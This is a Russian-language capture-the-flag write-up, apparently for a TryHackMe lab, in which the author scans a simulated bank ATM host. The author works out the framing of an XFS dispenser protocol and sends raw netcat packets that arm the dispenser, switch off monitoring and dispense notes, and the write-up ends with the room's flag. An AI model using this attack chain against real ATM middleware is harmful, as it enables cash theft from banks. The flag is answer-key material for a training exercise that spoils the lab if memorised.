

<img width="1780" height="221" alt="{9D778BCF-53F5-443C-A444-644133B0C458}" src="https://github.com/user-attachments/assets/91aff276-cbfa-461b-ae59-c18ea1755292" />


# Порты 

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-23 08:18 EST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 100.00% done; ETC: 08:18 (0:00:00 remaining)
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.02% done
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.05% done
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.11% done
Warning: 10.114.180.145 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.114.180.145
Host is up (0.065s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:23:2d:53:a9:92:01:69:7a:08:1b:4c:14:75:82:c3 (ECDSA)
|_  256 a4:b9:d3:8b:21:b6:2d:8a:df:b3:51:19:cc:a0:28:1a (ED25519)
8080/tcp open  http       BaseHTTPServer 0.6 (Python 3.12.3)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Earth's National Bank \xE2\x80\x94 Terminal 004 Engineering Console
|_http-server-header: BaseHTTP/0.6 Python/3.12.3
9100/tcp open  jetdirect?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## 8080 web 

<img width="1916" height="1022" alt="{FCB0C2FF-77DE-45B5-877D-AFBC0932E4E6}" src="https://github.com/user-attachments/assets/0f6ced0a-676f-4675-bb93-d9fe6accf92a" />

главная веб страница дает нам важную информацию - Session code: 726828,

## 9100 XFS bridge 

<img width="818" height="622" alt="{0E5C5D2A-0DCC-4E0E-8E3A-B4FE704E2900}" src="https://github.com/user-attachments/assets/8afbfa18-d642-4794-8c36-7ad7ec2d2610" />

тут написан формат ответа и формат запроса


```
формат ответа - 2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)
формат запроса - 1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data
msg_type - GETINFO": "0x01", "EXECUTE": "0x02
```

отправим команду 
```
printf '\x02\x00\x00\x04\xff\x00\x00' | nc -w 3 10.114.180.145 9100 | xxd
\x02\ - msg_type (execute) 
\x00\x00\x04\xff\ - cmd_id
\x00\x00 - length
```

<img width="1126" height="684" alt="{76CBBF94-14EF-479E-B789-2BAB016AC225}" src="https://github.com/user-attachments/assets/e65799d9-8e39-457e-bc32-79238582a944" />

no proof of cashout on r...


все функции которые мы увидели на скринах

```
WFS_INF_CDM_STATUS 0x301
WFS_INF_CDM_CASH_UNIT_INFO 0x303
WFS_INF_CDM_CAPABILITIES 0x304
WFS_CMD_CDM_DISPENSE 0x401
WFS_CMD_CDM_ARM	0x4f0
WFS_CMD_CDM_SET_MONITOR	0x4f1
WFS_CMD_CDM_GET_FLAG 0x4ff
```

давайте потрогаем WFS_INF_CDM_STATUS и WFS_INF_CDM_CASH_UNIT_INFO

### printf '\x01\x00\x00\x03\x01\x00\x00' | nc -w 3 10.114.180.145 9100 | xxd (WFS_INF_CDM_STATUS)

<img width="891" height="1145" alt="{00D8D24B-5224-49A6-91F6-020213DBE1B5}" src="https://github.com/user-attachments/assets/cf59c81f-3d0b-402e-8b80-0c9182650f5f" />

### printf '\x01\x00\x00\x03\x03\x00\x00' | nc -w 3 10.114.180.145 9100 | xxd (WFS_INF_CDM_CASH_UNIT_INFO)

<img width="885" height="871" alt="{542800BE-ABFC-4C35-B829-45F3847FDB49}" src="https://github.com/user-attachments/assets/719844f0-2a8b-453c-a403-1059d422fd31" />

#### Анализ 

с WFS_INF_CDM_STATUS мы получили такую вот информацию 

1. armed: false
2. monitor_on: true
3. dispensed_total: 0
4. remaining_notes: 280
5. nonce: "726828" (это мы уже знаем)
6. flag_released:  false

с WFS_INF_CDM_CASH_UNIT_INFO - CST1, CST2, CST3, CST4 - 100, 80, 60, 40


## Главная цепочка ARM - SET_MONITOR off - DISPENSE - GET_FLAG

сначала нам нужно перевести ARM в состояние true, после этого отключить мониторинг, выдать купюры через DISPENSE и получить флаг


но для того что бы нам перевести arm в тру, нам нужен код, который мы можем получить через приложение которое можно скачать на веб сайте


<img width="539" height="184" alt="{9FCFE80D-556E-49C0-9833-60248CCD2150}" src="https://github.com/user-attachments/assets/e5db3f82-0350-478f-8693-9a2bd629c68c" />

переводим 77483479 в ASCII  - \x37\x37\x34\x38\x33\x34\x37\x39 

<img width="1544" height="835" alt="{98F0685E-7DE6-41DB-9FD3-F3D06C6AE6FB}" src="https://github.com/user-attachments/assets/b1a1df51-e65c-4583-81d9-b3db6cc7a458" />

отключаем мониторинг
<img width="954" height="720" alt="{86471ABA-D543-4540-A06E-4833894240E7}" src="https://github.com/user-attachments/assets/9eb4de7a-dd06-43af-bb21-056a7513d577" />

выдаем себе 1 купюру и еще пару раз
<img width="1786" height="742" alt="{84298A22-A40A-4DD6-9AC4-83703A7313AF}" src="https://github.com/user-attachments/assets/6411f35e-44c4-496e-b533-aa65ca34b8b1" />

# FLAG

<img width="1033" height="725" alt="{FC5D87AA-9A40-43DA-A29F-30F8F61ACF22}" src="https://github.com/user-attachments/assets/2d00821c-46c7-46d8-993b-97a82e5bc0c0" />
THM{n0_card_n0_pin_just_the_wr0ng_v0ice_speaking_XFS}



































